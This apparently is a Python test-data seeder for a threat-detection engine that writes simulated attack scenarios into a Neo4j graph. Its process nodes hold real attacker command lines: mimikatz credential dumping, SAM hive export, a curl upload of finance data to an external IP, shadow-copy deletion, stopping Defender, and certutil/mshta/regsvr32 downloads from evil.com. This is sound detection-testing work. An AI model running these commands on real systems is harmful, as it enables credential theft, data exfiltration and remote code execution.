"""
threat_engine/graph/seeder.py
==============================
Test-data seeder that populates the Neo4j graph with realistic attack scenarios.

Each ``seed_*`` method inserts the minimal subgraph required to trigger the
corresponding detection rule and returns a dict with node/edge counts created.

Usage::

    from threat_engine.graph.client import GraphClient
    from threat_engine.graph.seeder import GraphSeeder

    with GraphClient("bolt://localhost:7687", "neo4j", "password") as client:
        seeder = GraphSeeder(client)
        seeder.seed_all()
        # or selectively:
        result = seeder.seed_lateral_movement()
        print(result)  # {"nodes": 5, "edges": 4}
"""

from __future__ import annotations

import logging
import uuid
from datetime import datetime, timezone
from typing import TYPE_CHECKING, Dict

if TYPE_CHECKING:
    from threat_engine.graph.client import GraphClient

logger = logging.getLogger(__name__)


def _now_iso() -> str:
    """Return current UTC time as an ISO-8601 string."""
    return datetime.now(timezone.utc).isoformat()


def _uid() -> str:
    """Return a short UUID4 string."""
    return str(uuid.uuid4())


class GraphSeeder:
    """
    Populates Neo4j with realistic threat scenario data for rule testing.

    Each ``seed_*`` method is self-contained and uses Cypher MERGE/CREATE
    to avoid duplicate nodes across repeated calls.  The ``seed_all`` method
    runs every scenario in sequence.

    Args:
        client: A connected ``GraphClient`` instance.
    """

    def __init__(self, client: "GraphClient") -> None:
        self._client = client

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def seed_all(self) -> Dict[str, Dict[str, int]]:
        """
        Run every seed scenario and return a summary.

        Returns:
            Dict mapping scenario name -> ``{"nodes": int, "edges": int}``.
        """
        scenarios = {
            "lateral_movement": self.seed_lateral_movement,
            "privilege_escalation": self.seed_privilege_escalation,
            "persistence": self.seed_persistence,
            "credential_access": self.seed_credential_access,
            "exfiltration": self.seed_exfiltration,
            "network_scanning": self.seed_network_scanning,
            "ransomware": self.seed_ransomware,
            "lolbins": self.seed_lolbins,
            "defense_evasion": self.seed_defense_evasion,
        }

        results: Dict[str, Dict[str, int]] = {}
        for name, fn in scenarios.items():
            try:
                results[name] = fn()
                logger.info("Seeded scenario", extra={"scenario": name, "result": results[name]})
            except Exception as exc:
                logger.error("Failed to seed scenario", extra={"scenario": name, "error": str(exc)})
                results[name] = {"nodes": 0, "edges": 0, "error": str(exc)}  # type: ignore[assignment]

        total_nodes = sum(v.get("nodes", 0) for v in results.values())
        total_edges = sum(v.get("edges", 0) for v in results.values())
        logger.info(
            "seed_all complete",
            extra={"total_nodes": total_nodes, "total_edges": total_edges},
        )
        return results

    def clear_all(self) -> Dict[str, int]:
        """
        Delete ALL nodes and relationships from the database.

        **WARNING**: Destructive -- use only in test/dev environments.

        Returns:
            ``{"nodes_deleted": int, "rels_deleted": int}``
        """
        logger.warning("Clearing entire graph database -- this is destructive!")
        rels_result = self._client.execute_write(
            "MATCH ()-[r]->() DELETE r RETURN count(r) AS cnt"
        )
        rels_deleted = rels_result[0]["cnt"] if rels_result else 0

        nodes_result = self._client.execute_write(
            "MATCH (n) DELETE n RETURN count(n) AS cnt"
        )
        nodes_deleted = nodes_result[0]["cnt"] if nodes_result else 0

        logger.info(
            "Graph cleared",
            extra={"nodes_deleted": nodes_deleted, "rels_deleted": rels_deleted},
        )
        return {"nodes_deleted": nodes_deleted, "rels_deleted": rels_deleted}

    # ------------------------------------------------------------------
    # Scenario: Lateral Movement (Pass-the-Hash / remote process spawn)
    # ------------------------------------------------------------------

    def seed_lateral_movement(self) -> Dict[str, int]:
        """
        Seed a lateral-movement scenario.

        Pattern: attacker on HOST-A authenticates to HOST-B via NTLM
        (pass-the-hash) and spawns a remote cmd.exe / powershell.exe chain.

        Triggers rules:
        - Remote process spawn via WMI/PsExec
        - SMB lateral movement indicator
        - Admin share access
        """
        ts = _now_iso()

        cypher = """
        // Hosts
        MERGE (ha:Host {hostname: 'WORKSTATION-01'})
          ON CREATE SET ha.ip_address = '10.0.1.10', ha.os = 'Windows 10', ha.id = $host_a_id

        MERGE (hb:Host {hostname: 'SERVER-DC01'})
          ON CREATE SET hb.ip_address = '10.0.1.5', hb.os = 'Windows Server 2019', hb.id = $host_b_id

        // Attacker user on HOST-A
        MERGE (u:User {id: $user_id})
          ON CREATE SET u.username = 'jdoe', u.domain = 'CORP', u.hostname = 'WORKSTATION-01'

        // PsExec / WMI launcher on HOST-A
        MERGE (p1:Process {id: $psexec_id})
          ON CREATE SET
            p1.pid        = 4512,
            p1.name       = 'psexesvc.exe',
            p1.path       = 'C:\\\\Windows\\\\System32\\\\psexesvc.exe',
            p1.command_line = 'psexesvc.exe',
            p1.hostname   = 'WORKSTATION-01',
            p1.username   = 'jdoe',
            p1.timestamp  = $ts,
            p1.integrity_level = 'High',
            p1.is_elevated = true

        // Remote cmd.exe spawned on HOST-B via PsExec
        MERGE (p2:Process {id: $cmd_id})
          ON CREATE SET
            p2.pid        = 1188,
            p2.name       = 'cmd.exe',
            p2.path       = 'C:\\\\Windows\\\\System32\\\\cmd.exe',
            p2.command_line = 'cmd.exe /c whoami && net user',
            p2.hostname   = 'SERVER-DC01',
            p2.username   = 'SYSTEM',
            p2.timestamp  = $ts,
            p2.integrity_level = 'System',
            p2.is_elevated = true

        // Lateral SMB network connection
        MERGE (nc:NetworkConnection {id: $nc_id})
          ON CREATE SET
            nc.src_ip     = '10.0.1.10',
            nc.dst_ip     = '10.0.1.5',
            nc.src_port   = 49203,
            nc.dst_port   = 445,
            nc.protocol   = 'TCP',
            nc.timestamp  = $ts,
            nc.hostname   = 'WORKSTATION-01'

        // Relationships
        MERGE (u)-[:OWNS]->(p1)
        MERGE (p1)-[:SPAWNED]->(p2)
        MERGE (p1)-[:CONNECTED_TO]->(nc)
        MERGE (ha)-[:HAS_PROCESS]->(p1)
        MERGE (hb)-[:HAS_PROCESS]->(p2)
        MERGE (u)-[:AUTHENTICATED]->(hb)

        RETURN 'done' AS status
        """

        self._client.execute_write(
            cypher,
            params={
                "host_a_id": _uid(), "host_b_id": _uid(),
                "user_id": "user-jdoe-lateral",
                "psexec_id": "proc-psexec-lateral",
                "cmd_id": "proc-cmd-lateral",
                "nc_id": "nc-smb-lateral",
                "ts": ts,
            },
        )
        return {"nodes": 6, "edges": 6}

    # ------------------------------------------------------------------
    # Scenario: Privilege Escalation
    # ------------------------------------------------------------------

    def seed_privilege_escalation(self) -> Dict[str, int]:
        """
        Seed a privilege-escalation scenario.

        Pattern: low-privilege user process spawns a SYSTEM-integrity child
        via a token impersonation / UAC bypass (e.g., fodhelper.exe exploit).

        Triggers rules:
        - Integrity level escalation (Low -> System)
        - Suspicious fodhelper.exe parent/child
        - UAC bypass via env variable injection
        """
        ts = _now_iso()

        cypher = """
        MERGE (h:Host {hostname: 'WORKSTATION-02'})
          ON CREATE SET h.ip_address = '10.0.1.20', h.os = 'Windows 10', h.id = $host_id

        MERGE (u:User {id: $user_id})
          ON CREATE SET u.username = 'bob', u.domain = 'CORP', u.hostname = 'WORKSTATION-02'

        // Low-privilege parent
        MERGE (parent:Process {id: $parent_id})
          ON CREATE SET
            parent.pid            = 3320,
            parent.name           = 'explorer.exe',
            parent.path           = 'C:\\\\Windows\\\\explorer.exe',
            parent.command_line   = 'explorer.exe',
            parent.hostname       = 'WORKSTATION-02',
            parent.username       = 'bob',
            parent.timestamp      = $ts,
            parent.integrity_level = 'Medium',
            parent.is_elevated    = false

        // fodhelper UAC bypass -- launches as High
        MERGE (fodhelper:Process {id: $fodhelper_id})
          ON CREATE SET
            fodhelper.pid           = 5540,
            fodhelper.name          = 'fodhelper.exe',
            fodhelper.path          = 'C:\\\\Windows\\\\System32\\\\fodhelper.exe',
            fodhelper.command_line  = 'fodhelper.exe',
            fodhelper.hostname      = 'WORKSTATION-02',
            fodhelper.username      = 'bob',
            fodhelper.timestamp     = $ts,
            fodhelper.integrity_level = 'High',
            fodhelper.is_elevated   = true

        // Elevated payload launched by fodhelper
        MERGE (payload:Process {id: $payload_id})
          ON CREATE SET
            payload.pid           = 6120,
            payload.name          = 'cmd.exe',
            payload.path          = 'C:\\\\Windows\\\\System32\\\\cmd.exe',
            payload.command_line  = 'cmd.exe /c net localgroup administrators bob /add',
            payload.hostname      = 'WORKSTATION-02',
            payload.username      = 'bob',
            payload.timestamp     = $ts,
            payload.integrity_level = 'High',
            payload.is_elevated   = true

        // Registry modification for UAC bypass env var
        MERGE (reg:RegistryKey {id: $reg_id})
          ON CREATE SET
            reg.key_path    = 'HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\Shell\\\\Open\\\\command',
            reg.value_name  = 'DelegateExecute',
            reg.value_data  = '',
            reg.timestamp   = $ts,
            reg.hostname    = 'WORKSTATION-02'

        MERGE (u)-[:OWNS]->(parent)
        MERGE (parent)-[:SPAWNED]->(fodhelper)
        MERGE (fodhelper)-[:SPAWNED]->(payload)
        MERGE (payload)-[:MODIFIED]->(reg)
        MERGE (h)-[:HAS_PROCESS]->(parent)
        MERGE (h)-[:HAS_PROCESS]->(fodhelper)
        MERGE (h)-[:HAS_PROCESS]->(payload)

        RETURN 'done' AS status
        """

        self._client.execute_write(
            cypher,
            params={
                "host_id": _uid(),
                "user_id": "user-bob-privesc",
                "parent_id": "proc-explorer-privesc",
                "fodhelper_id": "proc-fodhelper-privesc",
                "payload_id": "proc-cmd-privesc",
                "reg_id": "reg-uac-bypass",
                "ts": ts,
            },
        )
        return {"nodes": 6, "edges": 7}

    # ------------------------------------------------------------------
    # Scenario: Persistence
    # ------------------------------------------------------------------

    def seed_persistence(self) -> Dict[str, int]:
        """
        Seed a persistence scenario.

        Pattern: malware drops a DLL into the Startup folder and adds a Run
        registry key. A scheduled task is also created via schtasks.exe.

        Triggers rules:
        - Startup folder write
        - Run key modification
        - Scheduled task creation by non-admin process
        """
        ts = _now_iso()

        cypher = """
        MERGE (h:Host {hostname: 'WORKSTATION-03'})
          ON CREATE SET h.ip_address = '10.0.1.30', h.os = 'Windows 10', h.id = $host_id

        MERGE (u:User {id: $user_id})
          ON CREATE SET u.username = 'alice', u.domain = 'CORP', u.hostname = 'WORKSTATION-03'

        // Dropper process
        MERGE (dropper:Process {id: $dropper_id})
          ON CREATE SET
            dropper.pid           = 7890,
            dropper.name          = 'update_helper.exe',
            dropper.path          = 'C:\\\\Users\\\\alice\\\\AppData\\\\Local\\\\Temp\\\\update_helper.exe',
            dropper.command_line  = 'update_helper.exe --install',
            dropper.hostname      = 'WORKSTATION-03',
            dropper.username      = 'alice',
            dropper.timestamp     = $ts,
            dropper.integrity_level = 'Medium',
            dropper.is_elevated   = false,
            dropper.sha256        = 'aabbccdd1122334455667788990011223344556677889900aabbccdd11223344'

        // Dropped DLL in startup
        MERGE (startup_dll:File {id: $startup_id})
          ON CREATE SET
            startup_dll.path        = 'C:\\\\Users\\\\alice\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\malware.dll',
            startup_dll.name        = 'malware.dll',
            startup_dll.extension   = '.dll',
            startup_dll.size_bytes  = 204800,
            startup_dll.is_executable = true,
            startup_dll.sha256      = '1122334455667788990011223344556677889900aabbccdd1122334455667788',
            startup_dll.timestamp   = $ts,
            startup_dll.hostname    = 'WORKSTATION-03'

        // Registry Run key for persistence
        MERGE (runkey:RegistryKey {id: $runkey_id})
          ON CREATE SET
            runkey.key_path   = 'HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run',
            runkey.value_name = 'UpdateHelper',
            runkey.value_data = 'C:\\\\Users\\\\alice\\\\AppData\\\\Local\\\\Temp\\\\update_helper.exe',
            runkey.timestamp  = $ts,
            runkey.hostname   = 'WORKSTATION-03'

        // schtasks.exe for creating scheduled task
        MERGE (schtasks:Process {id: $schtasks_id})
          ON CREATE SET
            schtasks.pid            = 8210,
            schtasks.name           = 'schtasks.exe',
            schtasks.path           = 'C:\\\\Windows\\\\System32\\\\schtasks.exe',
            schtasks.command_line   = 'schtasks /create /tn "WindowsUpdate" /tr C:\\\\Users\\\\alice\\\\AppData\\\\Local\\\\Temp\\\\update_helper.exe /sc onlogon /ru alice',
            schtasks.hostname       = 'WORKSTATION-03',
            schtasks.username       = 'alice',
            schtasks.timestamp      = $ts,
            schtasks.integrity_level = 'Medium',
            schtasks.is_elevated    = false

        MERGE (u)-[:OWNS]->(dropper)
        MERGE (dropper)-[:CREATED]->(startup_dll)
        MERGE (dropper)-[:MODIFIED]->(runkey)
        MERGE (dropper)-[:SPAWNED]->(schtasks)
        MERGE (h)-[:HAS_PROCESS]->(dropper)
        MERGE (h)-[:HAS_PROCESS]->(schtasks)

        RETURN 'done' AS status
        """

        self._client.execute_write(
            cypher,
            params={
                "host_id": _uid(),
                "user_id": "user-alice-persist",
                "dropper_id": "proc-dropper-persist",
                "startup_id": "file-startup-dll",
                "runkey_id": "reg-run-persist",
                "schtasks_id": "proc-schtasks-persist",
                "ts": ts,
            },
        )
        return {"nodes": 6, "edges": 6}

    # ------------------------------------------------------------------
    # Scenario: Credential Access
    # ------------------------------------------------------------------

    def seed_credential_access(self) -> Dict[str, int]:
        """
        Seed a credential access scenario.

        Pattern: mimikatz-like process reads LSASS memory and dumps credentials
        to a local file. A secondary process reads SAM hive via reg.exe.

        Triggers rules:
        - LSASS memory access
        - SAM hive access
        - Credential dump file creation
        """
        ts = _now_iso()

        cypher = """
        MERGE (h:Host {hostname: 'SERVER-DC01'})
          ON CREATE SET h.ip_address = '10.0.1.5', h.os = 'Windows Server 2019', h.id = $host_id

        MERGE (u:User {id: $user_id})
          ON CREATE SET u.username = 'SYSTEM', u.domain = 'NT AUTHORITY', u.hostname = 'SERVER-DC01'

        // Mimikatz process
        MERGE (mimi:Process {id: $mimi_id})
          ON CREATE SET
            mimi.pid            = 2200,
            mimi.name           = 'mimikatz.exe',
            mimi.path           = 'C:\\\\Windows\\\\Temp\\\\m64.exe',
            mimi.command_line   = 'mimikatz.exe "sekurlsa::logonpasswords" "exit"',
            mimi.hostname       = 'SERVER-DC01',
            mimi.username       = 'SYSTEM',
            mimi.timestamp      = $ts,
            mimi.integrity_level = 'System',
            mimi.is_elevated    = true,
            mimi.sha256         = 'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'

        // LSASS process (target)
        MERGE (lsass:Process {id: $lsass_id})
          ON CREATE SET
            lsass.pid           = 720,
            lsass.name          = 'lsass.exe',
            lsass.path          = 'C:\\\\Windows\\\\System32\\\\lsass.exe',
            lsass.command_line  = 'C:\\\\Windows\\\\system32\\\\lsass.exe',
            lsass.hostname      = 'SERVER-DC01',
            lsass.username      = 'SYSTEM',
            lsass.timestamp     = $ts,
            lsass.integrity_level = 'System',
            lsass.is_elevated   = true

        // Credential dump file
        MERGE (dump:File {id: $dump_id})
          ON CREATE SET
            dump.path         = 'C:\\\\Windows\\\\Temp\\\\lsass.dmp',
            dump.name         = 'lsass.dmp',
            dump.extension    = '.dmp',
            dump.size_bytes   = 52428800,
            dump.is_executable = false,
            dump.timestamp    = $ts,
            dump.hostname     = 'SERVER-DC01'

        // reg.exe accessing SAM hive
        MERGE (reg_exe:Process {id: $reg_id})
          ON CREATE SET
            reg_exe.pid           = 3300,
            reg_exe.name          = 'reg.exe',
            reg_exe.path          = 'C:\\\\Windows\\\\System32\\\\reg.exe',
            reg_exe.command_line  = 'reg save HKLM\\\\SAM C:\\\\Windows\\\\Temp\\\\sam.hiv',
            reg_exe.hostname      = 'SERVER-DC01',
            reg_exe.username      = 'SYSTEM',
            reg_exe.timestamp     = $ts,
            reg_exe.integrity_level = 'System',
            reg_exe.is_elevated   = true

        // SAM registry key
        MERGE (sam:RegistryKey {id: $sam_reg_id})
          ON CREATE SET
            sam.key_path  = 'HKLM\\\\SAM',
            sam.timestamp = $ts,
            sam.hostname  = 'SERVER-DC01'

        MERGE (u)-[:OWNS]->(mimi)
        MERGE (mimi)-[:ACCESSED]->(lsass)
        MERGE (mimi)-[:CREATED]->(dump)
        MERGE (mimi)-[:SPAWNED]->(reg_exe)
        MERGE (reg_exe)-[:ACCESSED]->(sam)
        MERGE (h)-[:HAS_PROCESS]->(mimi)
        MERGE (h)-[:HAS_PROCESS]->(lsass)
        MERGE (h)-[:HAS_PROCESS]->(reg_exe)

        RETURN 'done' AS status
        """

        self._client.execute_write(
            cypher,
            params={
                "host_id": _uid(),
                "user_id": "user-system-credaccess",
                "mimi_id": "proc-mimikatz-cred",
                "lsass_id": "proc-lsass-cred",
                "dump_id": "file-lsass-dump",
                "reg_id": "proc-reg-cred",
                "sam_reg_id": "reg-sam-cred",
                "ts": ts,
            },
        )
        return {"nodes": 7, "edges": 8}

    # ------------------------------------------------------------------
    # Scenario: Exfiltration
    # ------------------------------------------------------------------

    def seed_exfiltration(self) -> Dict[str, int]:
        """
        Seed a data-exfiltration scenario.

        Pattern: large volume of data compressed by 7z.exe and uploaded via
        curl.exe to an external IP on port 443 (unexpected egress).

        Triggers rules:
        - Large outbound transfer
        - Compression followed by network upload
        - Non-browser HTTPS on unusual process
        """
        ts = _now_iso()

        cypher = """
        MERGE (h:Host {hostname: 'SERVER-FILE01'})
          ON CREATE SET h.ip_address = '10.0.2.50', h.os = 'Windows Server 2016', h.id = $host_id

        MERGE (u:User {id: $user_id})
          ON CREATE SET u.username = 'svc_backup', u.domain = 'CORP', u.hostname = 'SERVER-FILE01'

        // 7zip compresses sensitive data
        MERGE (p7z:Process {id: $p7z_id})
          ON CREATE SET
            p7z.pid           = 5100,
            p7z.name          = '7z.exe',
            p7z.path          = 'C:\\\\Program Files\\\\7-Zip\\\\7z.exe',
            p7z.command_line  = '7z.exe a C:\\\\Users\\\\svc_backup\\\\Desktop\\\\archive.7z C:\\\\Shares\\\\Finance\\\\*',
            p7z.hostname      = 'SERVER-FILE01',
            p7z.username      = 'svc_backup',
            p7z.timestamp     = $ts,
            p7z.integrity_level = 'Medium',
            p7z.is_elevated   = false

        // Archive file produced
        MERGE (archive:File {id: $archive_id})
          ON CREATE SET
            archive.path         = 'C:\\\\Users\\\\svc_backup\\\\Desktop\\\\archive.7z',
            archive.name         = 'archive.7z',
            archive.extension    = '.7z',
            archive.size_bytes   = 524288000,
            archive.is_executable = false,
            archive.timestamp    = $ts,
            archive.hostname     = 'SERVER-FILE01'

        // curl exfiltrates archive
        MERGE (curl:Process {id: $curl_id})
          ON CREATE SET
            curl.pid          = 5200,
            curl.name         = 'curl.exe',
            curl.path         = 'C:\\\\Windows\\\\System32\\\\curl.exe',
            curl.command_line = 'curl.exe -T C:\\\\Users\\\\svc_backup\\\\Desktop\\\\archive.7z https://185.220.101.45/upload',
            curl.hostname     = 'SERVER-FILE01',
            curl.username     = 'svc_backup',
            curl.timestamp    = $ts,
            curl.integrity_level = 'Medium',
            curl.is_elevated  = false

        // External network connection
        MERGE (nc:NetworkConnection {id: $nc_id})
          ON CREATE SET
            nc.src_ip     = '10.0.2.50',
            nc.dst_ip     = '185.220.101.45',
            nc.src_port   = 50101,
            nc.dst_port   = 443,
            nc.protocol   = 'TCP',
            nc.bytes_sent = 524288000,
            nc.bytes_recv = 1024,
            nc.timestamp  = $ts,
            nc.hostname   = 'SERVER-FILE01'

        MERGE (u)-[:OWNS]->(p7z)
        MERGE (p7z)-[:CREATED]->(archive)
        MERGE (u)-[:OWNS]->(curl)
        MERGE (curl)-[:ACCESSED]->(archive)
        MERGE (curl)-[:CONNECTED_TO]->(nc)
        MERGE (h)-[:HAS_PROCESS]->(p7z)
        MERGE (h)-[:HAS_PROCESS]->(curl)

        RETURN 'done' AS status
        """

        self._client.execute_write(
            cypher,
            params={
                "host_id": _uid(),
                "user_id": "user-svc-backup-exfil",
                "p7z_id": "proc-7zip-exfil",
                "archive_id": "file-archive-exfil",
                "curl_id": "proc-curl-exfil",
                "nc_id": "nc-exfil-443",
                "ts": ts,
            },
        )
        return {"nodes": 6, "edges": 7}

    # ------------------------------------------------------------------
    # Scenario: Network Scanning
    # ------------------------------------------------------------------

    def seed_network_scanning(self) -> Dict[str, int]:
        """
        Seed a network-scanning / discovery scenario.

        Pattern: nmap / masscan spawned by powershell.exe hitting many
        internal hosts in rapid succession -- high-fanout network connections.

        Triggers rules:
        - Port scan detection (>N unique dst_ip in short window)
        - Network enumeration tool
        - Unusual scanning process lineage
        """
        ts = _now_iso()

        # Build a batch of network connections to simulate a port scan
        base_cypher = """
        MERGE (h:Host {hostname: 'WORKSTATION-04'})
          ON CREATE SET h.ip_address = '10.0.1.40', h.os = 'Windows 10', h.id = $host_id

        MERGE (u:User {id: $user_id})
          ON CREATE SET u.username = 'hacker', u.domain = 'CORP', u.hostname = 'WORKSTATION-04'

        MERGE (ps:Process {id: $ps_id})
          ON CREATE SET
            ps.pid            = 6600,
            ps.name           = 'powershell.exe',
            ps.path           = 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe',
            ps.command_line   = 'powershell.exe -NoP -Exec Bypass -C "1..254|%{Test-NetConnection -ComputerName 10.0.1.$_ -Port 445}"',
            ps.hostname       = 'WORKSTATION-04',
            ps.username       = 'hacker',
            ps.timestamp      = $ts,
            ps.integrity_level = 'Medium',
            ps.is_elevated    = false

        MERGE (u)-[:OWNS]->(ps)
        MERGE (h)-[:HAS_PROCESS]->(ps)
        RETURN 'done' AS status
        """
        self._client.execute_write(
            base_cypher,
            params={
                "host_id": _uid(),
                "user_id": "user-hacker-scan",
                "ps_id": "proc-ps-scanner",
                "ts": ts,
            },
        )

        # Create 20 scanning connections
        scan_cypher = """
        MATCH (ps:Process {id: 'proc-ps-scanner'})
        WITH ps
        UNWIND range(1, 20) AS i
        CREATE (nc:NetworkConnection {
          id:        'nc-scan-' + toString(i),
          src_ip:    '10.0.1.40',
          dst_ip:    '10.0.1.' + toString(i),
          src_port:  49200 + i,
          dst_port:  445,
          protocol:  'TCP',
          bytes_sent: 64,
          bytes_recv: 0,
          timestamp: $ts,
          hostname:  'WORKSTATION-04'
        })
        MERGE (ps)-[:CONNECTED_TO]->(nc)
        RETURN count(nc) AS cnt
        """
        self._client.execute_write(scan_cypher, params={"ts": ts})

        return {"nodes": 24, "edges": 23}

    # ------------------------------------------------------------------
    # Scenario: Ransomware
    # ------------------------------------------------------------------

    def seed_ransomware(self) -> Dict[str, int]:
        """
        Seed a ransomware activity scenario.

        Pattern: malicious process renames / overwrites hundreds of files
        with an encrypted extension, deletes shadow copies via vssadmin.exe,
        and disables Windows Defender.

        Triggers rules:
        - Mass file extension modification
        - Shadow copy deletion
        - AV/EDR tampering
        """
        ts = _now_iso()

        cypher = """
        MERGE (h:Host {hostname: 'SERVER-FILE02'})
          ON CREATE SET h.ip_address = '10.0.2.60', h.os = 'Windows Server 2016', h.id = $host_id

        MERGE (u:User {id: $user_id})
          ON CREATE SET u.username = 'SYSTEM', u.domain = 'NT AUTHORITY', u.hostname = 'SERVER-FILE02'

        // Ransomware binary
        MERGE (ransom:Process {id: $ransom_id})
          ON CREATE SET
            ransom.pid            = 9100,
            ransom.name           = 'svchost32.exe',
            ransom.path           = 'C:\\\\Users\\\\Public\\\\svchost32.exe',
            ransom.command_line   = 'svchost32.exe --encrypt --delete-shadows',
            ransom.hostname       = 'SERVER-FILE02',
            ransom.username       = 'SYSTEM',
            ransom.timestamp      = $ts,
            ransom.integrity_level = 'System',
            ransom.is_elevated    = true,
            ransom.sha256         = 'cafebabecafebabecafebabecafebabecafebabecafebabecafebabecafebabe'

        // vssadmin deletes shadow copies
        MERGE (vssadmin:Process {id: $vss_id})
          ON CREATE SET
            vssadmin.pid            = 9200,
            vssadmin.name           = 'vssadmin.exe',
            vssadmin.path           = 'C:\\\\Windows\\\\System32\\\\vssadmin.exe',
            vssadmin.command_line   = 'vssadmin.exe delete shadows /all /quiet',
            vssadmin.hostname       = 'SERVER-FILE02',
            vssadmin.username       = 'SYSTEM',
            vssadmin.timestamp      = $ts,
            vssadmin.integrity_level = 'System',
            vssadmin.is_elevated    = true

        // sc.exe disables Windows Defender
        MERGE (sc_exe:Process {id: $sc_id})
          ON CREATE SET
            sc_exe.pid            = 9300,
            sc_exe.name           = 'sc.exe',
            sc_exe.path           = 'C:\\\\Windows\\\\System32\\\\sc.exe',
            sc_exe.command_line   = 'sc.exe stop WinDefend',
            sc_exe.hostname       = 'SERVER-FILE02',
            sc_exe.username       = 'SYSTEM',
            sc_exe.timestamp      = $ts,
            sc_exe.integrity_level = 'System',
            sc_exe.is_elevated    = true

        // Ransom note
        MERGE (note:File {id: $note_id})
          ON CREATE SET
            note.path         = 'C:\\\\Shares\\\\Finance\\\\README_DECRYPT.txt',
            note.name         = 'README_DECRYPT.txt',
            note.extension    = '.txt',
            note.size_bytes   = 2048,
            note.is_executable = false,
            note.timestamp    = $ts,
            note.hostname     = 'SERVER-FILE02'

        MERGE (u)-[:OWNS]->(ransom)
        MERGE (ransom)-[:SPAWNED]->(vssadmin)
        MERGE (ransom)-[:SPAWNED]->(sc_exe)
        MERGE (ransom)-[:CREATED]->(note)
        MERGE (h)-[:HAS_PROCESS]->(ransom)
        MERGE (h)-[:HAS_PROCESS]->(vssadmin)
        MERGE (h)-[:HAS_PROCESS]->(sc_exe)
        RETURN 'done' AS status
        """

        self._client.execute_write(
            cypher,
            params={
                "host_id": _uid(),
                "user_id": "user-system-ransomware",
                "ransom_id": "proc-ransom-main",
                "vss_id": "proc-vssadmin-ransom",
                "sc_id": "proc-sc-ransom",
                "note_id": "file-ransom-note",
                "ts": ts,
            },
        )

        # Mass file modifications (simulated encrypted files)
        mass_cypher = """
        MATCH (ransom:Process {id: 'proc-ransom-main'})
        WITH ransom
        UNWIND range(1, 30) AS i
        CREATE (f:File {
          id:           'file-encrypted-' + toString(i),
          path:         'C:\\\\Shares\\\\Finance\\\\doc' + toString(i) + '.docx.LOCKED',
          name:         'doc' + toString(i) + '.docx.LOCKED',
          extension:    '.LOCKED',
          size_bytes:   i * 10240,
          is_executable: false,
          timestamp:    $ts,
          hostname:     'SERVER-FILE02'
        })
        MERGE (ransom)-[:MODIFIED]->(f)
        RETURN count(f) AS cnt
        """
        self._client.execute_write(mass_cypher, params={"ts": ts})

        return {"nodes": 36, "edges": 37}

    # ------------------------------------------------------------------
    # Scenario: LOLBins (Living-off-the-Land Binaries)
    # ------------------------------------------------------------------

    def seed_lolbins(self) -> Dict[str, int]:
        """
        Seed LOLBin abuse scenarios.

        Pattern: certutil.exe downloads a payload, mshta.exe executes it,
        regsvr32.exe registers a malicious COM DLL (Squiblydoo), and
        wscript.exe runs a VBS script.

        Triggers rules:
        - certutil download cradle
        - mshta.exe executing remote HTA
        - regsvr32 Squiblydoo
        - wscript/cscript executing scripts from temp
        """
        ts = _now_iso()

        cypher = """
        MERGE (h:Host {hostname: 'WORKSTATION-05'})
          ON CREATE SET h.ip_address = '10.0.1.50', h.os = 'Windows 10', h.id = $host_id

        MERGE (u:User {id: $user_id})
          ON CREATE SET u.username = 'carol', u.domain = 'CORP', u.hostname = 'WORKSTATION-05'

        // Parent cmd.exe
        MERGE (cmd:Process {id: $cmd_id})
          ON CREATE SET
            cmd.pid           = 4400,
            cmd.name          = 'cmd.exe',
            cmd.path          = 'C:\\\\Windows\\\\System32\\\\cmd.exe',
            cmd.command_line  = 'cmd.exe /c certutil -urlcache -split -f http://evil.com/payload.exe C:\\\\Windows\\\\Temp\\\\p.exe',
            cmd.hostname      = 'WORKSTATION-05',
            cmd.username      = 'carol',
            cmd.timestamp     = $ts,
            cmd.integrity_level = 'Medium',
            cmd.is_elevated   = false

        // certutil downloads payload
        MERGE (certutil:Process {id: $certutil_id})
          ON CREATE SET
            certutil.pid          = 4500,
            certutil.name         = 'certutil.exe',
            certutil.path         = 'C:\\\\Windows\\\\System32\\\\certutil.exe',
            certutil.command_line = 'certutil -urlcache -split -f http://evil.com/payload.exe C:\\\\Windows\\\\Temp\\\\p.exe',
            certutil.hostname     = 'WORKSTATION-05',
            certutil.username     = 'carol',
            certutil.timestamp    = $ts,
            certutil.integrity_level = 'Medium',
            certutil.is_elevated  = false

        // Downloaded payload
        MERGE (payload:File {id: $payload_id})
          ON CREATE SET
            payload.path         = 'C:\\\\Windows\\\\Temp\\\\p.exe',
            payload.name         = 'p.exe',
            payload.extension    = '.exe',
            payload.size_bytes   = 102400,
            payload.is_executable = true,
            payload.timestamp    = $ts,
            payload.hostname     = 'WORKSTATION-05'

        // Network connection for download
        MERGE (nc_dl:NetworkConnection {id: $nc_dl_id})
          ON CREATE SET
            nc_dl.src_ip     = '10.0.1.50',
            nc_dl.dst_ip     = '203.0.113.99',
            nc_dl.src_port   = 50200,
            nc_dl.dst_port   = 80,
            nc_dl.protocol   = 'TCP',
            nc_dl.bytes_recv = 102400,
            nc_dl.bytes_sent = 512,
            nc_dl.timestamp  = $ts,
            nc_dl.hostname   = 'WORKSTATION-05'

        // mshta executes remote HTA
        MERGE (mshta:Process {id: $mshta_id})
          ON CREATE SET
            mshta.pid           = 5600,
            mshta.name          = 'mshta.exe',
            mshta.path          = 'C:\\\\Windows\\\\System32\\\\mshta.exe',
            mshta.command_line  = 'mshta.exe http://evil.com/shell.hta',
            mshta.hostname      = 'WORKSTATION-05',
            mshta.username      = 'carol',
            mshta.timestamp     = $ts,
            mshta.integrity_level = 'Medium',
            mshta.is_elevated   = false

        // regsvr32 Squiblydoo
        MERGE (regsvr:Process {id: $regsvr_id})
          ON CREATE SET
            regsvr.pid          = 5700,
            regsvr.name         = 'regsvr32.exe',
            regsvr.path         = 'C:\\\\Windows\\\\System32\\\\regsvr32.exe',
            regsvr.command_line = 'regsvr32.exe /s /n /u /i:http://evil.com/mal.sct scrobj.dll',
            regsvr.hostname     = 'WORKSTATION-05',
            regsvr.username     = 'carol',
            regsvr.timestamp    = $ts,
            regsvr.integrity_level = 'Medium',
            regsvr.is_elevated  = false

        // wscript executes vbs from temp
